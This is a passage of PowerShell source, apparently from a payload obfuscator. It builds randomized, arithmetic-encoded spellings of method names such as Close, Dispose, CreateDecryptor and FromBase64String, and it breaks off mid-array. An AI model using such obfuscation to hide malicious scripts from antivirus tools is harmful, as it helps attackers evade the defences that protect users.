        '([char]((19758 - 4554 - 8139 - 6998))+[char](((-6594 -Band 1139) + (-6594 -Bor 1139) + 8764 - 3233))+[char](((-13515 -Band 2333) + (-13515 -Bor 2333) + 5055 + 6238))+[char](((-2906 -Band 6762) + (-2906 -Bor 6762) - 4216 + 443))+[char]((4332 - 9518 + 4741 + 546)))',
        '([char]((2236 - 7938 + 3615 + 2186))+[char]((-1637 - 6888 + 6094 + 2507))+[char]((16082 - 2675 - 6745 - 6551))+[char]((-7673 - 1446 + 5301 + 3901))+[char](((-808 -Band 2586) + (-808 -Bor 2586) - 7026 + 5349)))',
        '([char](((-2533 -Band 427) + (-2533 -Bor 427) - 4629 + 6834))+[char]((12748 - 9180 - 5142 + 1682))+[char]((3976 - 9083 + 7124 - 1938))+[char](((9649 -Band 2261) + (9649 -Bor 2261) - 6034 - 5793))+[char]((-7617 - 7379 + 6036 + 9029)))',
        '([char](((1300 -Band 3421) + (1300 -Bor 3421) - 5436 + 814))+[char]((8598 - 7356 + 1908 - 3042))+[char](((-6568 -Band 910) + (-6568 -Bor 910) + 8940 - 3171))+[char]((-2789 - 241 - 3610 + 6723))+[char]((-1494 - 7104 + 1197 + 7502)))',
        '([char]((499 - 5359 + 224 + 4735))+[char](((6071 -Band 1883) + (6071 -Bor 1883) - 2249 - 5597))+[char](((-14380 -Band 5856) + (-14380 -Bor 5856) + 1704 + 6931))+[char]((-5333 - 765 + 2484 + 3729))+[char]((96 - 164 - 7836 + 8005)))')
    $closeobf = $nvclose | Get-Random
    return $closeobf
}

function disposeobf {
    $nvdispose = @(
        '([char]((-1132 - 9176 + 8050 + 2326))+[char](((-8385 -Band 1917) + (-8385 -Bor 1917) - 1160 + 7701))+[char](((-9476 -Band 4666) + (-9476 -Bor 4666) + 2223 + 2670))+[char](((-4326 -Band 2189) + (-4326 -Bor 2189) + 9783 - 7566))+[char]((-1078 - 6830 - 646 + 8633))+[char](((-10739 -Band 7605) + (-10739 -Bor 7605) + 8543 - 5326))+[char]((21011 - 8695 - 4035 - 8212)))',
        '([char](((-14493 -Band 5869) + (-14493 -Bor 5869) + 226 + 8466))+[char]((9738 - 551 - 7764 - 1318))+[char](((12421 -Band 3527) + (12421 -Bor 3527) - 6949 - 8884))+[char](((-5994 -Band 9780) + (-5994 -Bor 9780) - 5541 + 1867))+[char]((-5795 - 2025 + 7913 + 18))+[char]((7434 - 9995 - 3396 + 6072))+[char](((2895 -Band 3478) + (2895 -Bor 3478) - 3297 - 2975)))',
        '([char]((2377 - 8071 - 1838 + 7632))+[char]((13359 - 9009 - 6874 + 2597))+[char](((-13121 -Band 4384) + (-13121 -Bor 4384) + 8789 + 31))+[char](((-9063 -Band 2653) + (-9063 -Bor 2653) + 5209 + 1281))+[char]((11391 - 5657 - 6649 + 994))+[char]((28042 - 9249 - 9569 - 9141))+[char](((3217 -Band 2161) + (3217 -Bor 2161) - 6265 + 956)))',
        '([char](((-11467 -Band 6573) + (-11467 -Bor 6573) - 3739 + 8701))+[char]((12013 - 5489 + 935 - 7386))+[char](((-11568 -Band 3914) + (-11568 -Bor 3914) + 1981 + 5756))+[char](((1092 -Band 6777) + (1092 -Bor 6777) - 9168 + 1379))+[char](((3908 -Band 1397) + (3908 -Bor 1397) - 9431 + 4237))+[char](((6258 -Band 107) + (6258 -Bor 107) + 1776 - 8058))+[char](((-608 -Band 6163) + (-608 -Bor 6163) - 4926 - 560)))',
        '([char]((2233 - 4820 + 7143 - 4456))+[char](((8751 -Band 5656) + (8751 -Bor 5656) - 8636 - 5698))+[char](((-1148 -Band 3779) + (-1148 -Bor 3779) + 5306 - 7854))+[char]((335 - 2343 + 6381 - 4293))+[char](((-6150 -Band 7195) + (-6150 -Bor 7195) - 9646 + 8712))+[char]((11784 - 9148 - 1516 - 1037))+[char]((11784 - 3053 + 883 - 9513)))',
        '([char](((-2885 -Band 4797) + (-2885 -Bor 4797) + 5866 - 7678))+[char]((-279 - 4881 + 8416 - 3151))+[char](((2275 -Band 5742) + (2275 -Bor 5742) + 1481 - 9415))+[char](((10101 -Band 19) + (10101 -Bor 19) - 603 - 9437))+[char]((-6573 - 4734 + 9581 + 1805))+[char]((-5470 - 4440 + 9716 + 277))+[char](((3457 -Band 1269) + (3457 -Bor 1269) - 8253 + 3596)))',
        '([char](((1281 -Band 7923) + (1281 -Bor 7923) - 2305 - 6799))+[char]((156 - 5339 + 806 + 4482))+[char](((1982 -Band 3870) + (1982 -Bor 3870) - 8869 + 3132))+[char](((-19284 -Band 6970) + (-19284 -Bor 6970) + 2898 + 9496))+[char]((5665 - 1048 - 9563 + 5025))+[char]((2100 - 3862 - 4906 + 6751))+[char]((-8531 - 3673 + 3186 + 9087)))',
        '([char](((-7333 -Band 7559) + (-7333 -Bor 7559) - 9959 + 9833))+[char](((3683 -Band 8993) + (3683 -Bor 8993) - 8426 - 4145))+[char](((-5720 -Band 6741) + (-5720 -Bor 6741) + 8960 - 9866))+[char]((9268 - 7578 - 9270 + 7692))+[char](((-6560 -Band 5274) + (-6560 -Bor 5274) - 639 + 2036))+[char](((2115 -Band 4166) + (2115 -Bor 4166) - 5817 - 349))+[char](((-7715 -Band 7315) + (-7715 -Bor 7315) + 5620 - 5119)))')
    $disposeobf = $nvdispose | Get-Random
    return $disposeobf
}

function createdecr {
    $nvdecr = @(
        '([char](((-18756 -Band 145) + (-18756 -Bor 145) + 9864 + 8814))+[char](((-11994 -Band 4086) + (-11994 -Bor 4086) - 1948 + 9938))+[char](((4573 -Band 5478) + (4573 -Bor 5478) - 6099 - 3883))+[char](((-5969 -Band 4911) + (-5969 -Bor 4911) + 2734 - 1611))+[char]((-4311 - 3314 + 7196 + 513))+[char](((-15229 -Band 5658) + (-15229 -Bor 5658) + 9488 + 152))+[char](((-13828 -Band 5319) + (-13828 -Bor 5319) + 7415 + 1162))+[char]((3410 - 2769 - 2476 + 1904))+[char](((-13928 -Band 4227) + (-13928 -Bor 4227) + 6490 + 3278))+[char](((-10582 -Band 3506) + (-10582 -Bor 3506) + 6612 + 546))+[char]((-13849 - 977 + 5738 + 9177))+[char](((-3843 -Band 6483) + (-3843 -Bor 6483) - 2377 - 183))+[char]((5830 - 4127 + 3578 - 5197))+[char](((-7244 -Band 6314) + (-7244 -Bor 6314) - 8162 + 9171))+[char](((-417 -Band 867) + (-417 -Bor 867) - 3206 + 2838)))',
        '([char]((-3348 - 71 - 4599 + 8085))+[char]((803 - 7291 + 5126 + 1476))+[char]((4138 - 6129 + 9807 - 7715))+[char]((8916 - 879 - 5964 - 1976))+[char]((10417 - 5719 - 3844 - 738))+[char]((16565 - 3583 - 6015 - 6866))+[char]((5067 - 6506 + 1016 + 491))+[char](((-11103 -Band 9434) + (-11103 -Bor 9434) + 9568 - 7798))+[char]((14702 - 8362 - 3683 - 2558))+[char](((-17524 -Band 8691) + (-17524 -Bor 8691) + 7682 + 1265))+[char](((-9240 -Band 6275) + (-9240 -Bor 6275) - 6270 + 9356))+[char](((-7694 -Band 7716) + (-7694 -Bor 7716) + 806 - 716))+[char](((-16391 -Band 7864) + (-16391 -Bor 7864) + 1824 + 6819))+[char]((2880 - 9563 - 3009 + 9803))+[char](((-15 -Band 839) + (-15 -Bor 839) - 3501 + 2791)))',
        '([char]((-2284 - 6918 + 4358 + 4943))+[char](((-3673 -Band 4080) + (-3673 -Bor 4080) - 3236 + 2911))+[char]((17114 - 8169 - 5829 - 3047))+[char]((16038 - 2304 - 7201 - 6468))+[char]((19750 - 9715 - 1686 - 8265))+[char](((-9692 -Band 1402) + (-9692 -Bor 1402) + 3565 + 4794))+[char](((-3225 -Band 7201) + (-3225 -Bor 7201) - 9313 + 5405))+[char](((-6669 -Band 6067) + (-6669 -Bor 6067) + 2293 - 1622))+[char](((-12452 -Band 8669) + (-12452 -Bor 8669) + 7758 - 3908))+[char](((-14670 -Band 8466) + (-14670 -Bor 8466) + 3995 + 2291))+[char](((-7054 -Band 4276) + (-7054 -Bor 4276) + 9984 - 7117))+[char]((693 - 7202 + 8708 - 2119))+[char]((-132 - 6646 - 2770 + 9632))+[char]((9824 - 2423 - 3249 - 4073))+[char]((7963 - 8218 + 6544 - 6207)))',
        '([char](((-4711 -Band 4947) + (-4711 -Bor 4947) + 4007 - 4176))+[char](((-1244 -Band 6103) + (-1244 -Bor 6103) + 4497 - 9242))+[char]((16767 - 3721 - 4242 - 8703))+[char](((5570 -Band 2960) + (5570 -Bor 2960) - 3043 - 5422))+[char]((5848 - 6771 + 8472 - 7433))+[char](((-14901 -Band 2590) + (-14901 -Bor 2590) + 5713 + 6699))+[char]((-2226 - 8218 + 5310 + 5202))+[char]((-2866 - 6055 + 2547 + 6475))+[char]((16940 - 4463 - 5892 - 6486))+[char]((2382 - 1998 + 3289 - 3559))+[char](((2185 -Band 7337) + (2185 -Bor 7337) - 8708 - 693))+[char](((-15969 -Band 8365) + (-15969 -Bor 8365) + 3644 + 4072))+[char]((4615 - 996 - 6145 + 2642))+[char]((2193 - 2078 - 8703 + 8699))+[char](((-7371 -Band 7471) + (-7371 -Bor 7471) - 7421 + 7435)))',
        '([char]((-6737 - 4814 + 2132 + 9518))+[char]((7648 - 2371 + 1275 - 6470))+[char]((4265 - 4323 + 8750 - 8591))+[char]((362 - 686 - 6486 + 6875))+[char]((8064 - 4402 + 3529 - 7075))+[char](((-17975 -Band 5802) + (-17975 -Bor 5802) + 8468 + 3774))+[char]((10784 - 451 - 2273 - 7992))+[char](((12499 -Band 5051) + (12499 -Bor 5051) - 8587 - 8862))+[char](((-6004 -Band 4468) + (-6004 -Bor 4468) + 8341 - 6738))+[char](((946 -Band 5644) + (946 -Bor 5644) - 1174 - 5302))+[char](((15817 -Band 267) + (15817 -Bor 267) - 6798 - 9197))+[char]((18467 - 3712 - 4905 - 9738))+[char]((9249 - 5104 + 193 - 4254))+[char](((5585 -Band 7476) + (5585 -Bor 7476) - 5669 - 7281))+[char]((3983 - 2953 + 2390 - 3338)))',
        '([char](((-7942 -Band 9594) + (-7942 -Bor 9594) - 6038 + 4485))+[char](((-2991 -Band 7004) + (-2991 -Bor 7004) + 2155 - 6054))+[char](((-8649 -Band 9558) + (-8649 -Bor 9558) + 7311 - 8151))+[char](((8214 -Band 1040) + (8214 -Bor 1040) + 166 - 9323))+[char]((14654 - 9241 - 3482 - 1815))+[char]((15774 - 4651 - 6503 - 4519))+[char]((2063 - 9304 + 6086 + 1223))+[char]((7974 - 592 - 6860 - 421))+[char]((9222 - 5910 - 5048 + 1835))+[char](((-3950 -Band 6372) + (-3950 -Bor 6372) - 9469 + 7161))+[char]((-269 - 2745 - 3568 + 6703))+[char]((12794 - 9637 - 2308 - 769))+[char](((-1866 -Band 1833) + (-1866 -Bor 1833) + 5592 - 5443))+[char](((-8347 -Band 2223) + (-8347 -Bor 2223) + 5506 + 729))+[char](((-14390 -Band 9468) + (-14390 -Bor 9468) - 3597 + 8633)))',
        '([char]((10177 - 5912 + 2207 - 6405))+[char]((-641 - 2306 + 94 + 2935))+[char](((1380 -Band 5756) + (1380 -Bor 5756) + 2166 - 9233))+[char]((15793 - 1684 - 5994 - 8050))+[char]((6229 - 7465 + 4387 - 3067))+[char]((16432 - 9070 + 336 - 7629))+[char]((15543 - 4009 - 8147 - 3319))+[char]((9316 - 5632 + 695 - 4278))+[char](((-18941 -Band 4376) + (-18941 -Bor 4376) + 8200 + 6464))+[char]((-7493 - 2270 + 1157 + 8720))+[char]((1391 - 5833 + 9992 - 5461))+[char](((-3217 -Band 6864) + (-3217 -Bor 6864) - 5559 + 1992))+[char]((19910 - 668 - 9870 - 9288))+[char]((13626 - 9787 + 5631 - 9359))+[char]((2520 - 9737 + 6499 + 800)))',
        '([char]((3479 - 347 - 4284 + 1251))+[char]((6357 - 4264 + 2517 - 4496))+[char](((-18741 -Band 9901) + (-18741 -Bor 9901) + 8884 + 57))+[char]((-4933 - 1536 + 2016 + 4550))+[char]((-1642 - 8613 + 2990 + 7381))+[char](((7059 -Band 9520) + (7059 -Bor 9520) - 7127 - 9351))+[char](((-4566 -Band 239) + (-4566 -Bor 239) + 1958 + 2437))+[char](((-10869 -Band 9145) + (-10869 -Bor 9145) + 7771 - 5946))+[char]((17287 - 5629 - 8885 - 2674))+[char](((7565 -Band 768) + (7565 -Bor 768) - 8359 + 140))+[char]((13522 - 8643 - 6390 + 1632))+[char]((-12068 - 3957 + 8530 + 7607))+[char](((-9448 -Band 6897) + (-9448 -Bor 6897) - 570 + 3237))+[char](((-4397 -Band 4422) + (-4397 -Bor 4422) + 1087 - 1001))+[char]((1472 - 4802 - 36 + 3480)))')
    $decrobf = $nvdecr | Get-Random
    return $decrobf
}

function b64obf {
    $nvb64s = @(
            '([char]((25858 - 8397 - 8763 - 8628))+[char]((3408 - 7964 + 1827 + 2811))+[char]((463 - 4467 + 2660 + 1423))+[char](((8223 -Band 5000) + (8223 -Bor 5000) - 6454 - 6692))+[char](((-16108 -Band 8176) + (-16108 -Bor 8176) + 4642 + 3356))+[char]((-7324 - 2865 + 3466 + 6788))+[char](((2552 -Band 6780) + (2552 -Bor 6780) - 5130 - 4119))+[char](((-21612 -Band 6488) + (-21612 -Bor 6488) + 7750 + 7443))+[char]((9848 - 9466 + 8291 - 8619))+[char]((-2633 - 2160 - 4871 + 9716))+[char](((-5038 -Band 4788) + (-5038 -Bor 4788) + 7178 - 6845))+[char]((3948 - 3128 - 3604 + 2868))+[char](((-1940 -Band 7432) + (-1940 -Bor 7432) + 3532 - 8942))+[char]((5810 - 7162 - 6862 + 8287))+[char](((-8217 -Band 5739) + (-8217 -Bor 5739) + 8996 - 6440))+[char]((7472 - 9433 - 5730 + 7762)))',
            '([char](((407 -Band 6519) + (407 -Bor 6519) - 9193 + 2337))+[char]((24698 - 8945 - 8626 - 7013))+[char]((6052 - 5350 + 9090 - 9681))+[char](((-4299 -Band 5553) + (-4299 -Bor 5553) + 2206 - 3351))+[char]((17288 - 7770 - 7303 - 2149))+[char]((-3260 - 415 + 9671 - 5899))+[char]((-1485 - 2649 - 5442 + 9691))+[char]((1436 - 522 + 7538 - 8351))+[char](((-6602 -Band 4876) + (-6602 -Bor 4876) - 6086 + 7866))+[char](((-16422 -Band 9020) + (-16422 -Bor 9020) - 1638 + 9092))+[char](((-5518 -Band 8604) + (-5518 -Bor 8604) + 2519 - 5522))+[char](((2178 -Band 582) + (2178 -Bor 582) - 5427 + 2783))+[char]((3350 - 174 - 7164 + 4102))+[char](((-2604 -Band 3860) + (-2604 -Bor 3860) + 7344 - 8495))+[char]((-11342 - 3337 + 5690 + 9099))+[char]((5916 - 9674 + 7600 - 3739)))',
            '([char](((55 -Band 6708) + (55 -Bor 6708) + 1326 - 8019))+[char]((-3766 - 6100 + 9349 + 599))+[char](((-4234 -Band 3291) + (-4234 -Bor 3291) - 8845 + 9867))+[char](((-8050 -Band 6192) + (-8050 -Bor 6192) + 4340 - 2405))+[char](((-14861 -Band 7409) + (-14861 -Bor 7409) - 271 + 7789))+[char]((5715 - 8922 + 1287 + 1985))+[char](((6544 -Band 7874) + (6544 -Bor 7874) - 6162 - 8173))+[char](((-1209 -Band 6187) + (-1209 -Bor 6187) - 276 - 4633))+[char]((2515 - 3825 - 6060 + 7424))+[char](((5333 -Band 1018) + (5333 -Bor 1018) - 7498 + 1199))+[char](((-8337 -Band 4462) + (-8337 -Bor 4462) + 188 + 3770))+[char]((-300 - 411 - 1962 + 2757))+[char](((-9604 -Band 4993) + (-9604 -Bor 4993) + 6600 - 1907))+[char](((-11046 -Band 2272) + (-11046 -Bor 2272) + 9314 - 435))+[char](((967 -Band 8319) + (967 -Bor 8319) - 7360 - 1816))+[char](((3041 -Band 1800) + (3041 -Bor 1800) - 9458 + 4720)))',
            '([char]((1466 - 1055 + 4252 - 4593))+[char]((10060 - 7291 - 8201 + 5514))+[char]((-16365 - 1014 + 8525 + 8933))+[char]((-3801 - 3209 + 3484 + 3603))+[char]((12448 - 7909 + 1950 - 6423))+[char](((-12238 -Band 9620) + (-12238 -Bor 9620) - 3109 + 5792))+[char]((2467 - 5751 + 7135 - 3768))+[char](((-8715 -Band 7891) + (-8715 -Bor 7891) + 9051 - 8158))+[char](((3015 -Band 595) + (3015 -Bor 595) + 3290 - 6846))+[char](((-4489 -Band 5883) + (-4489 -Bor 5883) + 968 - 2310))+[char](((4295 -Band 1256) + (4295 -Bor 1256) + 1978 - 7446))+[char](((-19519 -Band 6710) + (-19519 -Bor 6710) + 7391 + 5502))+[char]((8703 - 5175 - 321 - 3093))+[char](((-3054 -Band 6823) + (-3054 -Bor 6823) - 4572 + 908))+[char]((11081 - 8274 + 5110 - 7807))+[char](((-6996 -Band 8960) + (-6996 -Bor 8960) + 5376 - 7237)))',
            '([char]((5779 - 4203 + 721 - 2227))+[char](((-1817 -Band 448) + (-1817 -Bor 448) - 1996 + 3447))+[char](((-8193 -Band 4364) + (-8193 -Bor 4364) - 3443 + 7351))+[char]((-7753 - 144 + 2431 + 5543))+[char]((13495 - 8714 + 3140 - 7855))+[char](((-10960 -Band 1342) + (-10960 -Bor 1342) + 1987 + 7696))+[char](((-679 -Band 509) + (-679 -Bor 509) - 1809 + 2062))+[char]((13793 - 291 - 9049 - 4384))+[char](((-4257 -Band 371) + (-4257 -Bor 371) + 9774 - 5834))+[char](((2728 -Band 6949) + (2728 -Bor 6949) - 6180 - 3445))+[char](((-7417 -Band 9972) + (-7417 -Bor 9972) - 4800 + 2328))+[char]((22255 - 9675 - 4279 - 8185))+[char]((4749 - 1788 + 1172 - 4019))+[char](((5565 -Band 107) + (5565 -Bor 107) + 959 - 6558))+[char](((-3120 -Band 6274) + (-3120 -Bor 6274) - 8846 + 5802))+[char](((-22800 -Band 6736) + (-22800 -Bor 6736) + 8081 + 8086)))',
            '([char](((2882 -Band 7726) + (2882 -Bor 7726) - 4435 - 6103))+[char](((-2512 -Band 3277) + (-2512 -Bor 3277) + 2816 - 3499))+[char](((7231 -Band 89) + (7231 -Bor 89) - 9978 + 2737))+[char](((1795 -Band 9473) + (1795 -Bor 9473) - 6455 - 4736))+[char]((12723 - 7690 + 517 - 5484))+[char]((-15399 - 1333 + 7397 + 9400))+[char](((-5803 -Band 5121) + (-5803 -Bor 5121) + 6393 - 5628))+[char](((-4840 -Band 6444) + (-4840 -Bor 6444) + 5686 - 7221))+[char](((16038 -Band 2205) + (16038 -Bor 2205) - 9263 - 8926))+[char]((-245 - 7033 + 7138 + 192))+[char](((7994 -Band 1303) + (7994 -Bor 1303) - 1848 - 7366))+[char]((3378 - 6935 - 6233 + 9906))+[char]((2889 - 6942 - 3961 + 8128))+[char]((5868 - 4239 + 7516 - 9040))+[char](((-5637 -Band 8313) + (-5637 -Bor 8313) + 1137 - 3703))+[char]((-4078 - 2121 + 5114 + 1188)))',
            '([char](((-19892 -Band 9657) + (-19892 -Bor 9657) + 2674 + 7631))+[char]((8641 - 2678 - 6193 + 312))+[char](((5203 -Band 8598) + (5203 -Bor 8598) - 6960 - 6762))+[char](((527 -Band 2) + (527 -Bor 2) - 389 - 63))+[char](((5808 -Band 1493) + (5808 -Bor 1493) - 5093 - 2142))+[char]((4391 - 8464 + 2809 + 1329))+[char](((7821 -Band 5323) + (7821 -Bor 5323) - 5277 - 7784))+[char](((-5871 -Band 3364) + (-5871 -Bor 3364) + 823 + 1753))+[char]((-13758 - 736 + 9183 + 5365))+[char](((-8133 -Band 2823) + (-8133 -Bor 2823) + 166 + 5196))+[char](((-12174 -Band 1551) + (-12174 -Bor 1551) + 9976 + 730))+[char](((-7538 -Band 2845) + (-7538 -Bor 2845) + 4546 + 231))+[char](((-412 -Band 6851) + (-412 -Bor 6851) - 9669 + 3312))+[char](((-4392 -Band 1392) + (-4392 -Bor 1392) - 4123 + 7228))+[char](((-131 -Band 8023) + (-131 -Bor 8023) - 5243 - 2571))+[char]((12175 - 4012 - 7675 - 417)))',
            '([char]((9226 - 7132 + 3330 - 5354))+[char]((-6105 - 2275 + 8280 + 182))+[char](((-8680 -Band 9327) + (-8680 -Bor 9327) + 3471 - 4039))+[char]((15945 - 5095 - 2691 - 8082))+[char]((6696 - 4015 + 3021 - 5636))+[char](((11233 -Band 4076) + (11233 -Bor 4076) - 9452 - 5760))+[char]((3734 - 5342 - 4235 + 5958))+[char]((11583 - 3789 - 774 - 6919))+[char]((-2449 - 978 - 895 + 4376))+[char](((-5356 -Band 4397) + (-5356 -Bor 4397) + 9705 - 8694))+[char](((-850 -Band 5258) + (-850 -Bor 5258) - 1426 - 2899))+[char](((5857 -Band 97) + (5857 -Bor 97) - 2087 - 3751))+[char](((-19244 -Band 8965) + (-19244 -Bor 8965) + 1367 + 9026))+[char]((2849 - 926 - 7286 + 5468))+[char]((-11525 - 4622 + 7978 + 8279))+[char]((-9068 - 8082 + 9691 + 7562)))',
            '([char]((15904 - 4918 - 4136 - 6780))+[char]((8626 - 1503 - 8028 + 987))+[char](((6457 -Band 251) + (6457 -Bor 251) - 8700 + 2071))+[char](((167 -Band 8744) + (167 -Bor 8744) + 31 - 8865))+[char](((-2661 -Band 5097) + (-2661 -Bor 5097) + 4665 - 7003))+[char](((-11041 -Band 5370) + (-11041 -Bor 5370) + 6301 - 533))+[char]((1613 - 1360 + 5212 - 5350))+[char]((3475 - 91 + 207 - 3490))+[char]((11044 - 9922 - 1377 + 309))+[char](((-3708 -Band 3577) + (-3708 -Bor 3577) + 8089 - 7906))+[char]((-2301 - 2030 - 1372 + 5786))+[char]((1982 - 6753 + 7776 - 2921))+[char](((622 -Band 5582) + (622 -Bor 5582) + 3452 - 9574))+[char](((-21056 -Band 8734) + (-21056 -Bor 8734) + 9546 + 2849))+[char](((-15062 -Band 6096) + (-15062 -Bor 6096) + 5256 + 3788))+[char](((-3500 -Band 4568) + (-3500 -Bor 4568) - 8878 + 7881)))',
            '([char](((10549 -Band 5576) + (10549 -Bor 5576) - 6817 - 9238))+[char](((-10614 -Band 452) + (-10614 -Bor 452) + 3227 + 7049))+[char]((6651 - 5199 + 4047 - 5388))+[char](((1430 -Band 9) + (1430 -Bor 9) + 811 - 2141))+[char](((-4090 -Band 8339) + (-4090 -Bor 8339) - 5267 + 1084))+[char]((13827 - 7680 - 6321 + 271))+[char]((988 - 4562 + 122 + 3567))+[char](((-13388 -Band 3923) + (-13388 -Bor 3923) + 6717 + 2849))+[char]((-12412 - 921 + 3544 + 9843))+[char](((-13335 -Band 8627) + (-13335 -Bor 8627) - 5221 + 9981))+[char]((440 - 89 + 7228 - 7496))+[char]((17531 - 7743 - 8251 - 1453))+[char]((-82 - 1639 + 8463 - 6660))+[char]((11025 - 9476 - 1525 + 81))+[char]((-5547 - 3784 + 1770 + 7639))+[char](((6717 -Band 1549) + (6717 -Bor 1549) - 2030 - 6165)))',
            '([char]((-6552 - 4995 + 5945 + 5672))+[char]((5193 - 2316 + 3945 - 6708))+[char]((24745 - 9691 - 8219 - 6756))+[char](((-8344 -Band 8432) + (-8344 -Bor 8432) + 3581 - 3560))+[char]((-11535 - 7710 + 9448 + 9863))+[char]((13592 - 4916 - 7084 - 1495))+[char]((-3572 - 5177 + 5785 + 3047))+[char](((13863 -Band 1316) + (13863 -Bor 1316) - 5898 - 9180))+[char](((-14432 -Band 8513) + (-14432 -Bor 8513) - 1548 + 7521))+[char]((-2174 - 1363 + 5818 - 2229))+[char](((-6719 -Band 188) + (-6719 -Bor 188) + 3110 + 3504))+[char]((9197 - 6056 - 156 - 2869))+[char]((4896 - 1103 - 8672 + 4961))+[char](((-1541 -Band 4116) + (-1541 -Bor 4116) + 4795 - 7265))+[char](((-11871 -Band 908) + (-11871 -Bor 908) + 4175 + 6866))+[char]((223 - 924 + 5508 - 4704)))',
            '([char](((-6723 -Band 7515) + (-6723 -Bor 7515) + 3605 - 4295))+[char]((25817 - 9702 - 9835 - 6198))+[char]((6998 - 3644 - 6623 + 3348))+[char]((-6327 - 2968 + 7059 + 2313))+[char]((3053 - 6087 + 8301 - 5201))+[char]((-956 - 5213 + 9135 - 2901))+[char](((-92 -Band 6167) + (-92 -Bor 6167) - 7908 + 1916))+[char](((-10012 -Band 9469) + (-10012 -Bor 9469) + 4257 - 3645))+[char]((-11196 - 4264 + 5668 + 9846))+[char]((19419 - 7842 - 9538 - 1987))+[char](((-10459 -Band 7630) + (-10459 -Bor 7630) - 2733 + 5645))+[char]((5658 - 5499 + 8446 - 8521))+[char](((7842 -Band 2109) + (7842 -Bor 2109) - 9325 - 544))+[char](((-3465 -Band 9372) + (-3465 -Bor 9372) + 112 - 5946))+[char]((-4737 - 7645 + 4490 + 7970))+[char](((-422 -Band 1126) + (-422 -Bor 1126) - 9808 + 9175)))',
            '([char]((7776 - 1486 - 1997 - 4223))+[char](((-4474 -Band 1757) + (-4474 -Bor 1757) - 3460 + 6291))+[char]((-4794 - 2110 + 809 + 6174))+[char](((-4192 -Band 1663) + (-4192 -Bor 1663) + 4914 - 2276))+[char]((-2669 - 5186 + 6107 + 1814))+[char]((6803 - 8600 + 9722 - 7860))+[char]((4243 - 2891 + 3210 - 4479))+[char](((8382 -Band 754) + (8382 -Bor 754) - 801 - 8266))+[char]((3312 - 617 + 1232 - 3873))+[char]((10086 - 9382 + 3835 - 4487))+[char]((9793 - 7174 - 8492 + 5956))+[char](((856 -Band 3107) + (856 -Bor 3107) - 6373 + 2494))+[char]((8868 - 9189 + 1384 - 981))+[char]((12845 - 3507 - 8624 - 641))+[char](((-3152 -Band 2543) + (-3152 -Bor 2543) - 1230 + 1917))+[char]((18434 - 6476 - 7110 - 4777)))',
            '([char]((-670 - 4106 - 3289 + 8135))+[char](((-16305 -Band 5858) + (-16305 -Bor 5858) + 9407 + 1154))+[char]((6958 - 2702 - 102 - 4075))+[char]((21969 - 5299 - 9294 - 7267))+[char](((2244 -Band 4982) + (2244 -Bor 4982) - 8481 + 1321))+[char]((8017 - 9114 + 7317 - 6123))+[char]((-861 - 7122 + 2815 + 5283))+[char]((6436 - 8542 - 1047 + 3254))+[char](((-16919 -Band 3957) + (-16919 -Bor 3957) + 8581 + 4435))+[char]((-1592 - 7553 + 52 + 9145))+[char](((-6566 -Band 3876) + (-6566 -Bor 3876) + 3023 - 250))+[char]((-8663 - 4924 + 6553 + 7150))+[char](((-4913 -Band 5145) + (-4913 -Bor 5145) + 3565 - 3683))+[char]((19179 - 9838 - 7073 - 2163))+[char](((-2609 -Band 8361) + (-2609 -Bor 8361) - 7105 + 1463))+[char]((1908 - 8984 + 405 + 6774)))',
            '([char]((7757 - 5249 + 4445 - 6883))+[char]((-6493 - 4263 + 9591 + 1247))+[char]((9467 - 489 - 8895 - 4))+[char](((3801 -Band 229) + (3801 -Bor 229) + 3137 - 7090))+[char](((-3054 -Band 9790) + (-3054 -Bor 9790) - 8333 + 1695))+[char](((-10839 -Band 4941) + (-10839 -Bor 4941) + 2696 + 3267))+[char](((13712 -Band 455) + (13712 -Bor 455) - 6965 - 7119))+[char](((-4193 -Band 8258) + (-4193 -Bor 8258) - 7675 + 3711))+[char](((-4100 -Band 8888) + (-4100 -Bor 8888) + 3368 - 8102))+[char]((-9871 - 5120 + 8746 + 6297))+[char](((-10356 -Band 8576) + (-10356 -Bor 8576) + 8047 - 6184))+[char]((2374 - 5087 + 1991 + 806))+[char]((-1071 - 5410 + 8307 - 1744))+[char]((2166 - 4294 + 4097 - 1864))+[char]((12225 - 7932 - 4875 + 692))+[char](((-7476 -Band 9084) + (-7476 -Bor 9084) - 6369 + 4864)))',
            '([char]((3081 - 7725 + 7630 - 2884))+[char](((-8194 -Band 3423) + (-8194 -Bor 3423) + 6847 - 1962))+[char]((6326 - 8965 - 4211 + 6961))+[char](((-11941 -Band 4175) + (-11941 -Bor 4175) + 4383 + 3492))+[char](((-19947 -Band 7443) + (-19947 -Bor 7443) + 9229 + 3373))+[char]((-2212 - 2986 + 1855 + 3440))+[char]((3937 - 9232 + 9258 - 3848))+[char](((13167 -Band 1646) + (13167 -Bor 1646) - 8474 - 6238))+[char](((-1438 -Band 5925) + (-1438 -Bor 5925) - 1731 - 2702))+[char]((-5642 - 2621 - 1592 + 9907))+[char](((-14347 -Band 7853) + (-14347 -Bor 7853) - 410 + 7019))+[char]((4635 - 8589 + 3636 + 434))+[char]((-4275 - 2599 + 8039 - 1051))+[char](((-10922 -Band 3625) + (-10922 -Bor 3625) + 1916 + 5486))+[char]((-5670 - 7042 + 6988 + 5834))+[char](((-8604 -Band 2163) + (-8604 -Bor 2163) + 1604 + 4940)))')
    $b64obf = $nvb64s | Get-Random
    return $b64obf
}

function paddingobf {
    $nvpadding = @(
        '([char](((1078 -Band 6403) + (1078 -Bor 6403) + 560 - 7961))+[char]((-12740 - 2812 + 9773 + 5844))+[char](((-23832 -Band 8292) + (-23832 -Bor 8292) + 7034 + 8574))+[char]((2595 - 8795 + 875 + 5393))+[char]((3794 - 9680 - 2318 + 8277))+[char](((403 -Band 2723) + (403 -Bor 2723) + 3532 - 6580))+[char]((7785 - 6656 + 5375 - 6433)))',
        '([char]((5218 - 8219 - 5039 + 8120))+[char]((8021 - 4144 - 8982 + 5202))+[char](((8714 -Band 4216) + (8714 -Bor 4216) - 5369 - 7461))+[char](((-5500 -Band 7347) + (-5500 -Bor 7347) - 3928 + 2181))+[char](((9195 -Band 3115) + (9195 -Bor 3115) - 5191 - 7014))+[char](((-2311 -Band 7608) + (-2311 -Bor 7608) - 4786 - 401))+[char](((5367 -Band 4660) + (5367 -Bor 4660) - 9390 - 534)))',
